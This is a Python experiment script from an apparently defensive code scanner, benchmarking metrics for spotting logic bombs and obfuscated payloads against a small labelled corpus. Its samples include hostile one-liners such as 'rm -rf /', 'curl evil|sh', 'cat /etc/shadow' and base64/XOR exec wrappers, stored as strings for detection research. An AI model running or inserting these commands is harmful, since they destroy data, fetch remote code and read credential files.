"""
fractal_ab_experiment.py — A/B study: complex-dynamics vs entropy/fractal metrics
=================================================================================
EXPERIMENT ONLY — this module is intentionally NOT imported by the analyzer or
any production code path. It preserves the evidence behind two design decisions:

  * The **Mandelbrot escape-time "trigger-fragility"** metric was REJECTED — it
    gave no measurable lift over a trivial ``rareness × severity`` baseline
    (AUC 0.75 vs 0.75); it is that baseline in disguise.
  * The **entropy + Higuchi fractal-dimension** obfuscation channel was SHIPPED
    (see ../obfuscation.py) — it cleanly separates encoded payloads from benign
    code, lifting combined separation to AUC ~0.88.

Run it:
    cd sinkline
    python experiments/fractal_ab_experiment.py

It re-derives the numbers quoted in the README so the methodology is auditable.
Requires numpy and the parent package's analyzer.scan_sinks for feature
extraction (experiments may depend on production; production never depends on
experiments).
"""
from __future__ import annotations

import ast
import math
import os
import sys
from collections import Counter

import numpy as np

# Make the parent package importable when run from sinkline/.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from analyzer import scan_sinks  # noqa: E402

# --------------------------------------------------------------------------- #
# Labelled corpus
# --------------------------------------------------------------------------- #
MALICIOUS = {
    "prob_bomb": "import random,os\nif random.random()<0.02:\n    os.system('rm -rf /')",
    "deep_prob_bomb": "import random,os\nif random.random()<0.005:\n    os.system('curl evil|sh')",
    "chained_bomb": "k=0\nif random.randint(0,9)==3:\n    k+=1\nif random.randint(0,9)==5:\n    k+=1\nif k==2:\n    os.system('shutdown')",
    "stego_exec": "import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())",
    "xor_blob": "data=[104,105,106,107,108,109,110,111]\nkey=42\nexec(bytes([b^key for b in data]).decode())",
    "env_keyed": "import os\nif os.getenv('USER')=='admin':\n    os.system('cat /etc/shadow')",
    "antidebug": "import random,time,os\nif random.random()<0.09:\n    time.sleep(99999)\n    os.system('x')",
    "cross_func": "import random,os\ndef q1(x): return random.random()<0.2\ndef q2(y): return q1(y) and random.random()<0.1\nif q2(u): os.system('shutdown')",
}
BENIGN = {
    "ab_test": "import random\nif random.random()<0.1:\n    log_metric('variant_b')",
    "retry_sleep": "import time\nfor i in range(3):\n    try: connect()\n    except: time.sleep(2**i)",
    "data_proc": "def mean(xs):\n    return sum(xs)/len(xs) if xs else 0",
    "argparse": "import argparse\np=argparse.ArgumentParser()\np.add_argument('--n',type=int)\nargs=p.parse_args()",
    "class_def": "class Cache:\n    def __init__(self): self.d={}\n    def get(self,k): return self.d.get(k)",
    "string_fmt": "def banner(n):\n    return chr(61)*n + ' hello '",
    "config_load": "import os\ndb=os.getenv('DB_URL','localhost')\nprint('connecting',db)",
    "sampling": "import random\nxs=[random.random() for _ in range(100)]\nprint(sum(xs)/100)",
}

_SINKS = {"system", "popen", "exec", "eval", "shutdown", "grant_root_access",
          "unlock_root", "rmtree", "remove", "Popen", "call", "run", "__import__", "compile"}


# --------------------------------------------------------------------------- #
# Feature extraction
# --------------------------------------------------------------------------- #
def _body_has_sink(ifnode):
    for n in ast.walk(ifnode):
        if isinstance(n, ast.Call):
            f = n.func
            nm = f.id if isinstance(f, ast.Name) else getattr(f, "attr", "")
            if nm in _SINKS:
                return True
    return False


def rareness_and_severity(code):
    """(R, S): how rare the trigger is, and sink severity in guarded branches."""
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return 0.0, 0.0
    R = 0.0
    for n in ast.walk(tree):
        if isinstance(n, ast.If) and _body_has_sink(n):
            src = ast.dump(n.test).lower()
            for c in ast.walk(n.test):
                if isinstance(c, ast.Constant) and isinstance(c.value, (int, float)):
                    v = float(c.value)
                    if "random" in src and 0 < v < 1:
                        R = max(R, 1.0 - v)
                    elif "randint" in src:
                        R = max(R, 0.85)
                    elif isinstance(c.value, int) and c.value >= 2:
                        R = max(R, min(0.5 + 0.06 * c.value, 0.95))
            if ("getenv" in src or "environ" in src) and "eq" in src:
                R = max(R, 0.8)
    sinks = scan_sinks(code)
    S = 1.0 if any(s.in_guarded_branch for s in sinks) else (0.7 if sinks else 0.0)
    return R, S


# --------------------------------------------------------------------------- #
# Candidate metrics
# --------------------------------------------------------------------------- #
def baseline(code):
    R, S = rareness_and_severity(code)
    return float(R * S)


def _escape_time(c, max_iter=80, radius=2.0):
    z = 0j
    for i in range(max_iter):
        z = z * z + c
        if abs(z) > radius:
            return i
    return max_iter


def mandelbrot_fragility(code):
    """REJECTED metric: map (R,S) onto the Mandelbrot boundary and measure local
    escape-time sensitivity. Kept here purely as evidence — see verdict below."""
    R, S = rareness_and_severity(code)
    c0 = complex(0.0, 0.0) if (R == 0 and S == 0) else complex(0.25 - 0.9 * R, 0.2 * S + 0.55 * R)
    d = 0.012
    vals = [_escape_time(c0 + complex(dx, dy)) for dx in (-d, 0, d) for dy in (-d, 0, d)]
    return float(min(1.0, np.std(vals) / 8.0))


def obfuscation_index(code):
    """SHIPPED metric (mirrors ../obfuscation.py): entropy of encoded literals +
    Higuchi fractal dimension of the byte-entropy curve + decode/exec context."""
    from obfuscation import analyze_obfuscation
    return analyze_obfuscation(code).score


def combined(code):
    return max(baseline(code), obfuscation_index(code))


# --------------------------------------------------------------------------- #
# Evaluation
# --------------------------------------------------------------------------- #
def auc(pos, neg):
    pos, neg = np.array(pos), np.array(neg)
    wins = ties = 0
    for p in pos:
        wins += np.sum(p > neg)
        ties += np.sum(p == neg)
    return (wins + 0.5 * ties) / (len(pos) * len(neg))


def evaluate(name, fn):
    mal = [fn(c) for c in MALICIOUS.values()]
    ben = [fn(c) for c in BENIGN.values()]
    a = auc(mal, ben)
    print(f"\n## {name}")
    print(f"   malicious mean={np.mean(mal):.3f}  benign mean={np.mean(ben):.3f}  AUC={a:.3f}")
    return a


def main():
    print("=" * 68)
    print("A/B EXPERIMENT — fractal/complex-dynamics detection metrics")
    print("=" * 68)
    results = {
        "Baseline (rareness x severity)": evaluate("Baseline", baseline),
        "Mandelbrot trigger-fragility": evaluate("Mandelbrot trigger-fragility", mandelbrot_fragility),
        "Obfuscation-Index (entropy + Higuchi FD)": evaluate("Obfuscation-Index", obfuscation_index),
        "Combined (baseline OR obfuscation)": evaluate("Combined", combined),
    }
    print("\n" + "=" * 68)
    print("VERDICT")
    print("=" * 68)
    for name, a in sorted(results.items(), key=lambda x: -x[1]):
        print(f"  {name:42s} AUC={a:.3f}")
    print("\nDecision: Mandelbrot fragility ~= baseline (no lift) -> REJECTED.")
    print("          Obfuscation-Index adds a new channel -> SHIPPED in obfuscation.py.")


if __name__ == "__main__":
    main()
